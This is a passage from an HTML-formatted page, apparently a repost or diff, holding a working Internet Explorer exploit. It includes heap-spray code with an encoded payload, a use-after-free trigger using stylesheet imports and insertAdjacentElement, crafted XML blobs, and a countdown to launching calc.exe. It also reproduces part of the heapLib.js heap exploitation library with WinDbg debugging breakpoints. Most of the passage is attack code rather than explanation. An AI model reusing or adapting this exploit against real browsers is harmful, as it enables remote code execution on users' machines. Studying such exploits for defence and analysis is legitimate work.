"%u0142%u0143%u0144%u0145%u0146%u0147%u0148%u0149%u014A%u014B%u014C%u014D%u014E%u014F%u0150%u0151%u0152%u0153%u0154%u0155%u0156%u0157%u0158%u0159%u015A%u015B%u015C%u015D%u015E%u015F%u0160%u0161%u0162%u0163%u0164%u0165%u0166%u0167%u0168%u0169%u016A%u016B%u016C%u016D%u016E%u016F%u0170%u0171%u0172%u0173%u0174%u0175%u0176%u0177%u0178%u0179%u017A%u017B%u017C%u017D%u017E%u017F%u0180%u0181%u0182%u0183%u0184%u0185%u0186%u0187%u0188%u0189%u018A%u018B%u018C%u018D%u018E%u018F%u0190%u0191%u0192%u0193%u0194%u0195%u0196%u0197%u0198%u0199%u019A%u019B%u019C%u019D%u019E%u019F%u01A0%u01A1%u01A2%u01A3%u01A4%u01A5%u01A6%u01A7%u01A8%u01A9%u01AA%u01AB%u01AC%u01AD%u01AE%u01AF%u01B0%u01B1%u01B2%u01B3%u01B4%u01B5%u01B6%u01B7%u01B8%u01B9%u01BA%u01BB%u01BC%u01BD%u01BE%u01BF%u01C0%u01C1%u01C2%u01C3%u01C4%u01C5%u01C6%u01C7%u01C8%u01C9%u01CA%u01CB%u01CC%u01CD%u01CE%u01CF%u01D0%u01D1%u01D2%u01D3%u01D4%u01D5%u01D6%u01D7%u01D8%u01D9%u01DA%u01DB%u01DC%u01DD%u01DE%u01DF%u01E0%u01E1%u01E2%u01E3%u01E4%u01E5%u01E6%u01E7%u01E8%u01E9%u01EA%u01EB%u01EC%u01ED%u01EE%u01EF" + "%u20A0%u1604" + "%u01F2%u01F3%u01F4%u01F5%u01F6%u01F7%u01F8%u01F9%u01FA%u01FB%u01FC%u01FD%u01FE%u01FF%u0200%u0201%u0202%u0203%u0204%u0205%u0206%u0207%u0208%u0209%u020A%u020B%u020C%u020D%u020E%u020F%u0210%u0211%u0212%u0213%u0214%u0215%u0216%u0217%u0218%u0219%u021A%u021B%u021C%u021D%u021E%u021F%u0220%u0221%u0222%u0223%u0224%u0225%u0226%u0227%u0228%u0229%u022A%u022B%u022C%u022D%u022E%u022F%u0230%u0231%u0232%u0233%u0234%u0235%u0236%u0237%u0238%u0239%u023A%u023B%u023C%u023D%u023E%u023F%u0240%u0241%u0242%u0243%u0244%u0245%u0246%u0247%u0248%u0249%u024A%u024B%u024C%u024D%u024E%u024F%u0250%u0251%u0252%u0253%u0254%u0255%u0256%u0257%u0258%u0259%u025A%u025B%u025C%u025D%u025E%u025F%u0260%u0261%u0262%u0263%u0264%u0265%u0266%u0267%u0268%u0269%u026A%u026B%u026C%u026D%u026E%u026F%u0270%u0271%u0272%u0273%u0274%u0275%u0276%u0277%u0278%u0279%u027A%u027B%u027C%u027D%u027E%u027F%u0280%u0281%u0282%u0283%u0284%u0285%u0286%u0287%u0288%u0289%u028A%u028B%u028C%u028D%u028E%u028F%u0290%u0291%u0292%u0293%u0294%u0295%u0296%u0297%u0298%u0299%u029A%u029B%u029C%u029D%u029E%u029F%u02A0%u02A1%u02A2%u02A3%u02A4%u02A5%u02A6%u02A7%u02A8%u02A9%u02AA%u02AB%u02AC%u02AD%u02AE%u02AF%u02B0%u02B1%u02B2%u02B3%u02B4%u02B5%u02B6%u02B7%u02B8%u02B9%u02BA%u02BB%u02BC%u02BD%u02BE%u02BF%u02C0%u02C1%u02C2%u02C3%u02C4%u02C5%u02C6%u02C7%u02C8%u02C9%u02CA%u02CB%u02CC%u02CD%u02CE%u02CF%u02D0%u02D1%u02D2%u02D3%u02D4%u02D5%u02D6%u02D7%u02D8%u02D9%u02DA%u02DB%u02DC%u02DD%u02DE%u02DF%u02E0%u02E1%u02E2%u02E3%u02E4%u02E5%u02E6%u02E7%u02E8%u02E9%u02EA%u02EB%u02EC%u02ED%u02EE%u02EF%u02F0%u02F1%u02F2%u02F3%u02F4%u02F5%u02F6%u02F7%u02F8%u02F9%u02FA%u02FB%u02FC%u02FD%u02FE%u02FF");</P>
+<P>&nbsp; while(heapspray.length &lt; 0x200) heapspray += unescape("%u4444");</P>
+<P>&nbsp; var heapblock = heapspray; <br />
+&nbsp; while(heapblock.length &lt; 0x40000) heapblock += heapblock; <br />
+&nbsp; finalspray = heapblock.substring(2, 0x40000 - 0x21);</P>
+<P>&nbsp; //alert('Base address of ado15.dll ' + adobase.toString(16)); <br />
+&nbsp; if(CurrentHeapSpraySize &lt; 900) { <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; window.setTimeout(SprayHeap, 100); <br />
+&nbsp; } <br />
+&nbsp; else { <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; RunExploit(); <br />
+&nbsp; } <br />
+}</P>
+<P>function SprayHeap() { <br />
+&nbsp; if(CurrentHeapSpraySize &lt; FinalHeapSpraySize - 1) { <br />
+&nbsp;&nbsp;&nbsp; for(var i = 0; i &lt; 90; i++) { <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; heap.alloc(finalspray); <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; CurrentHeapSpraySize++; <br />
+&nbsp;&nbsp;&nbsp; } <br />
+&nbsp;&nbsp;&nbsp; var percentcomplete = Math.round(CurrentHeapSpraySize /FinalHeapSpraySize * 100); <br />
+&nbsp;&nbsp;&nbsp; document.getElementById('progressfasetwo').innerText = percentcomplete + "%";&nbsp;&nbsp;&nbsp;  <br />
+&nbsp;&nbsp;&nbsp; window.setTimeout(SprayHeap, 100); <br />
+&nbsp; }&nbsp;  <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; else { <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; document.getElementById('textfasetwodone').innerText = "Ready to start calc.exe in: ";&nbsp;&nbsp;&nbsp;  <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; window.setTimeout(RunExploitTimer, 100); <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; } <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;  <br />
+}</P>
+<P>function RunExploitTimer() { <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(ExpoitTime &gt; 0) { <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; document.getElementById('countexploitrun').innerText = ExpoitTime; <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; window.setTimeout(RunExploitTimer, 500); <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ExpoitTime--; <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; } <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; else { <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; document.getElementById('countexploitrun').innerText = 0;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;  <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; var EndTime = new Date(); <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; var TotalRun = Math.round((EndTime.getTime() - StartTime.getTime()) / 1000); <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; document.getElementById('totalruntime').innerText = "Total exploitation time: " + TotalRun + " seconds";&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;  <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; window.setTimeout(RunExploit, 100); <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; } <br />
+} <br />
+&nbsp;&nbsp;&nbsp;  <br />
+function RunExploit() { <br />
+&nbsp; <br />
+&nbsp; var elms = new Array(); <br />
+&nbsp; for(i =0; i &lt; 100; i++) { <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; elms.push(document.createElement('div')); <br />
+&nbsp; }</P>
+<P>&nbsp; owningObj = document.styleSheets[0].owningElement;&nbsp; </P>
+<P>&nbsp; myimports = document.styleSheets[0].imports;</P>
+<P>&nbsp; document.appendChild(owningObj); <br />
+&nbsp; document.removeChild(owningObj);</P>
+<P>&nbsp; owningObj.outerHTML = 'a';</P>
+<P>&nbsp; Math.atan2(0xbabe, "Collect"); <br />
+&nbsp; CollectGarbage();</P>
+<P>&nbsp; Math.atan2(0xbabe, "spray"); <br />
+&nbsp; for(i = 0; i &lt; 100; i++) { <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; elms[i].className = unescape("%u4140%u4141%u4142%u4143%u4144%u4145%u4146%u4147%u4148%u4149%u414a%u414b%u414c%u414d%u414e%u414f%u4151%u4152%u4153%u4154%u2020%u1604%u2020%u1604%u4159%u415a%u415b"); <br />
+&nbsp; }&nbsp;&nbsp; </P>
+<P>&nbsp; Result = owningObj.insertAdjacentElement(myimports,'a'); <br />
+&nbsp; <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;  <br />
+}&nbsp;&nbsp;&nbsp; </P>
+<P>function MakeAddressString(addrint) { <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //First, turn into hex: <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; var addstr = addrint.toString(16); <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //Split and swap <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; addstr = addstr.replace(/(\w\w\w\w)(\w\w\w\w)/,"%u$2%u$1"); <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return addstr; <br />
+} <br />
+&nbsp;&nbsp;&nbsp;  <br />
+&nbsp;&nbsp;&nbsp; &lt;/script&gt;</P>
+<P>&nbsp; &lt;/head&gt; <br />
+&nbsp; &lt;body onLoad="window.setTimeout(Start,100);" id="bodyid"&gt; <br />
+&nbsp; &lt;div&gt; <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;h2 id="textfaseone"&gt;&lt;/h2&gt; <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;  <br />
+&nbsp;&nbsp;&nbsp; &lt;h2 id="progressfaseone"&gt;&lt;/h2&gt; <br />
+&nbsp;&nbsp;&nbsp;  <br />
+&nbsp;&nbsp;&nbsp; &lt;h2 id="textfaseonedone"&gt;&lt;/h2&gt; <br />
+&nbsp;&nbsp;&nbsp;  <br />
+&nbsp;&nbsp;&nbsp; &lt;h2 id="textfoundaddress"&gt;&lt;/h2&gt; <br />
+&nbsp;&nbsp;&nbsp;  <br />
+&nbsp;&nbsp;&nbsp; &lt;h2 id="textfasetwo"&gt;&lt;/h2&gt; <br />
+&nbsp;&nbsp;&nbsp;  <br />
+&nbsp;&nbsp;&nbsp; &lt;h2 id="progressfasetwo"&gt;&lt;/h2&gt; <br />
+&nbsp;&nbsp;&nbsp;  <br />
+&nbsp;&nbsp;&nbsp; &lt;h2 id="textfasetwodone"&gt;&lt;/h2&gt; <br />
+&nbsp;&nbsp;&nbsp;  <br />
+&nbsp;&nbsp;&nbsp; &lt;h2 id="countexploitrun"&gt;&lt;/h2&gt; <br />
+&nbsp;&nbsp;&nbsp;  <br />
+&nbsp;&nbsp;&nbsp; &lt;h2 id="totalruntime"&gt;&lt;/h2&gt; <br />
+&nbsp; &lt;/div&gt;</P>
+<P>&lt;?xml version="1.0" encoding="utf-8" standalone="yes"?&gt; <br />
+&lt;XML ID="xmlid1"&gt; <br />
+&lt;Devices&gt; <br />
+&lt;Device&gt; <br />
+&lt;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA /&gt; <br />
+&lt;/Device&gt; <br />
+&lt;/Devices&gt; <br />
+&lt;/XML&gt;</P>
+<P>&lt;?xml version="1.0" encoding="utf-8" standalone="yes"?&gt; <br />
+&lt;XML ID="xmlid2"&gt; <br />
+&lt;Devices&gt; <br />
+&lt;Device&gt; <br />
+&lt;BBBB /&gt; <br />
+&lt;/Device&gt; <br />
+&lt;/Devices&gt; <br />
+&lt;/XML&gt;</P>
+<P>&lt;?xml version="1.0" encoding="utf-8" standalone="yes"?&gt; <br />
+&lt;XML ID="xmlid3"&gt; <br />
+&lt;root&gt; <br />
+&lt;data&gt; <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;SmallData&gt; <br />
+&nbsp; &lt;/SmallData&gt; <br />
+&lt;MyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLong&gt; <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; value1 <br />
+&lt;/MyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLong&gt; <br />
+&lt;/data&gt; <br />
+&lt;/root&gt; <br />
+&lt;/XML&gt;</P>
+<P>&lt;?xml version="1.0" encoding="utf-8" standalone="yes"?&gt; <br />
+&lt;XML ID="xmlid4"&gt; <br />
+&lt;Devices&gt; <br />
+&lt;Device&gt; <br />
+&lt;bb /&gt; <br />
+&lt;/Device&gt; <br />
+&lt;/Devices&gt; <br />
+&lt;/XML&gt;</P>
+<P>&lt;?xml version="1.0" encoding="utf-8" standalone="yes"?&gt; <br />
+&lt;XML ID="xmlid5"&gt; <br />
+&lt;Devices&gt; <br />
+&lt;Device&gt; <br />
+&lt;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB /&gt; <br />
+&lt;/Device&gt; <br />
+&lt;/Devices&gt; <br />
+&lt;/XML&gt;</P>
+<P>&lt;?xml version="1.0" encoding="utf-8" standalone="yes"?&gt; <br />
+&lt;XML ID="xmlid6"&gt; <br />
+&lt;root&gt; <br />
+&lt;data&gt; <br />
+&lt;CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC&gt; <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; value2 <br />
+&lt;/CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC&gt; <br />
+&lt;/data&gt; <br />
+&lt;/root&gt; <br />
+&lt;/XML&gt;</P>
+<P>&nbsp; &lt;/body&gt; <br />
+&lt;/html&gt;</P></TD></TR></TBODY></TABLE></P>
+<P>
+<TABLE style="BORDER-RIGHT: #cccccc 1px dotted; TABLE-LAYOUT: fixed; BORDER-TOP: #cccccc 1px dotted; BORDER-LEFT: #cccccc 1px dotted; BORDER-BOTTOM: #cccccc 1px dotted" cellSpacing=0 cellPadding=6 width="95%" align=center border=0>
+<TBODY>
+<TR>
+<TD style="WORD-WRAP: break-word" bgColor=#f3f3f3>
+<P><FONT style="FONT-WEIGHT: bold; COLOR: #990000">heapLib.js：</FONT></P>
+<P>/* <br />
+&nbsp;&nbsp; JavaScript Heap Exploitation library <br />
+&nbsp;&nbsp; by Alexander Sotirov &lt;[email]asotirov@determina.com[/email]&gt; <br />
+&nbsp;  <br />
+&nbsp;&nbsp; Version 0.3</P>
+<P> <br />
+&nbsp;&nbsp; To enable debugging output, set the following WinDbg breakpoints:</P>
+<P>bc * <br />
+bu 7c9106eb "j (poi(esp+4)==0x150000) '.printf \"alloc(0x%x) = 0x%x\", poi(esp+c), eax; .echo; g'; 'g';" <br />
+bu ntdll!RtlFreeHeap "j ((poi(esp+4)==0x150000) &amp; (poi(esp+c)!=0)) '.printf \"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; free(0x%x), size=0x%x\", poi(esp+c), wo(poi(esp+c)-8)*8-8; .echo; g'; 'g';" <br />
+bd 0 1 <br />
+bu jscript!JsAtan2 "j (poi(poi(esp+14)+18) == babe) '.printf \"DEBUG: %mu\", poi(poi(poi(esp+14)+8)+8); .echo; g';" <br />
+bu jscript!JsAtan "j (poi(poi(esp+14)+8) == babe) '.echo DEBUG: Enabling heap breakpoints; be 0 1; g';" <br />
+bu jscript!JsAsin "j (poi(poi(esp+14)+8) == babe) '.echo DEBUG: Disabling heap breakpoints; bd 0 1; g';" <br />
+bu jscript!JsAcos "j (poi(poi(esp+14)+8) == babe) '.echo DEBUG: heapLib breakpoint'" <br />
+g</P>
+<P>&nbsp;&nbsp; To disabled the OLEAUT32 cache, set oleaut32!g_fDebNoCache to 1</P>
+<P>*/</P>
+<P> <br />
+// <br />
+// heapLib namespace <br />
+//</P>
+<P>function heapLib() { <br />
+}</P>
+<P> <br />
+// <br />
+// heapLib class <br />
+//</P>
+<P>// heapLib.ie constructor <br />
+// <br />
+// Creates a new heapLib API object for Internet Explorer. The maxAlloc <br />
+// argument sets the maximum block size that can be allocated using the alloc() <br />
+// function. <br />
+// <br />
+// Arguments: <br />
+//&nbsp;&nbsp;&nbsp; maxAlloc - maximum allocation size in bytes (defaults to 65535) <br />
+//&nbsp;&nbsp;&nbsp; heapBase - base of the default process heap (defaults to 0x150000) <br />
+//</P>
+<P>heapLib.ie = function(maxAlloc, heapBase) {</P>
+<P>&nbsp;&nbsp;&nbsp; this.maxAlloc = (maxAlloc ? maxAlloc : 65535); <br />
+&nbsp;&nbsp;&nbsp; this.heapBase = (heapBase ? heapBase : 0x150000);</P>
+<P>&nbsp;&nbsp;&nbsp; // Allocate a padding string that uses maxAlloc bytes <br />
+&nbsp;&nbsp;&nbsp; this.paddingStr = "AAAA";</P>
+<P>&nbsp;&nbsp;&nbsp; while (4 + this.paddingStr.length*2 + 2 &lt; this.maxAlloc) { <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; this.paddingStr += this.paddingStr; <br />
+&nbsp;&nbsp;&nbsp; } <br />
+&nbsp;&nbsp;&nbsp;  <br />
+&nbsp;&nbsp;&nbsp; // Create an array for storing references to allocated memory <br />
+&nbsp;&nbsp;&nbsp; this.mem = new Array();</P>
+<P>&nbsp;&nbsp;&nbsp; // Call flushOleaut32() once to allocate the maximum size blocks <br />
+&nbsp;&nbsp;&nbsp; this.flushOleaut32(); <br />
+}</P>
+<P> <br />
+// <br />
+// Outputs a debugging message in WinDbg. The msg argument must be a string <br />
+// literal. Using string concatenation to build the message will result in heap <br />
+// allocations. <br />
+// <br />
+// Arguments: <br />
+//&nbsp;&nbsp;&nbsp; msg - string to output <br />
+//</P>
+<P>heapLib.ie.prototype.debug = function(msg) { <br />
+&nbsp;&nbsp;&nbsp; void(Math.atan2(0xbabe, msg)); <br />
+}</P>
+<P> <br />
+// <br />
+// Enables or disables logging of heap operations in WinDbg. <br />
+// <br />
+// Arguments: <br />
+//&nbsp;&nbsp;&nbsp; enable - a boolean value, set to true to enable heap logging <br />
+//</P>
+<P>heapLib.ie.prototype.debugHeap = function(enable) {</P>
+<P>&nbsp;&nbsp;&nbsp; if (enable == true) <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; void(Math.atan(0xbabe)); <br />
+&nbsp;&nbsp;&nbsp; else <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; void(Math.asin(0xbabe)); <br />
+}</P>
+<P> <br />
+// <br />
+// Triggers a breakpoint in the debugger. <br />
+//</P>
+<P>heapLib.ie.prototype.debugBreak = function(msg) { <br />
+&nbsp;&nbsp;&nbsp; void(Math.acos(0xbabe)); <br />
+}</P>
+<P> <br />
+// <br />
+// Returns a string of a specified length, up to the maximum allocation size <br />
+// set in the heapLib.ie constructor. The string contains "A" characters. <br />
+// <br />
+// Arguments: <br />
+//&nbsp;&nbsp;&nbsp; len - length in characters <br />
+//</P>
+<P>heapLib.ie.prototype.padding = function(len) { <br />
+&nbsp;&nbsp;&nbsp; if (len &gt; this.paddingStr.length) <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; throw "Requested padding string length " + len + ", only " + this.paddingStr.length + " available";</P>
+<P>&nbsp;&nbsp;&nbsp; return this.paddingStr.substr(0, len); <br />
+}</P>
+<P> <br />
+// <br />
+// Returns a number rounded up to a specified value. <br />
+// <br />
+// Arguments: <br />
+//&nbsp;&nbsp;&nbsp; num&nbsp;&nbsp; - integer to round <br />
+//&nbsp;&nbsp;&nbsp; round - value to round to <br />
+//</P>
+<P>heapLib.ie.prototype.round = function(num, round) { <br />
+&nbsp;&nbsp;&nbsp; if (round == 0) <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; throw "Round argument cannot be 0";</P>
+<P>&nbsp;&nbsp;&nbsp; return parseInt((num + (round-1)) / round) * round; <br />
+}</P>
+<P> <br />
+// <br />
+// Converts an integer to a hex string. This function uses the heap. <br />
+// <br />
+// Arguments: <br />
+//&nbsp;&nbsp;&nbsp; num&nbsp;&nbsp; - integer to convert <br />
+//&nbsp;&nbsp;&nbsp; width - pad the output with zeros to a specified width (optional) <br />
+//</P>
+<P>heapLib.ie.prototype.hex = function(num, width) <br />
+{ <br />
+&nbsp;&nbsp;&nbsp; var digits = "0123456789ABCDEF";</P>
+<P>&nbsp;&nbsp;&nbsp; var hex = digits.substr(num &amp; 0xF, 1);</P>
+<P>&nbsp;&nbsp;&nbsp; while (num &gt; 0xF) { <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; num = num &gt;&gt;&gt; 4; <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; hex = digits.substr(num &amp; 0xF, 1) + hex; <br />
+&nbsp;&nbsp;&nbsp; }</P>
+<P>&nbsp;&nbsp;&nbsp; var width = (width ? width : 0);</P>
+<P>&nbsp;&nbsp;&nbsp; while (hex.length &lt; width) <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; hex = "0" + hex;</P>
+<P>&nbsp;&nbsp;&nbsp; return hex; <br />
+}</P>
+<P> <br />
+// <br />
+// Convert a 32-bit address to a 4-byte string with the same representation in <br />
+// memory. This function uses the heap. <br />
+// <br />
+// Arguments: <br />
+//&nbsp;&nbsp;&nbsp; addr - integer representation of the address <br />
+//</P>
+<P>heapLib.ie.prototype.addr = function(addr) { <br />
+&nbsp;&nbsp;&nbsp; return unescape("%u" + this.hex(addr &amp; 0xFFFF, 4) + "%u" + this.hex((addr &gt;&gt; 16) &amp; 0xFFFF, 4)); <br />
+}</P>
+<P> <br />
+// <br />
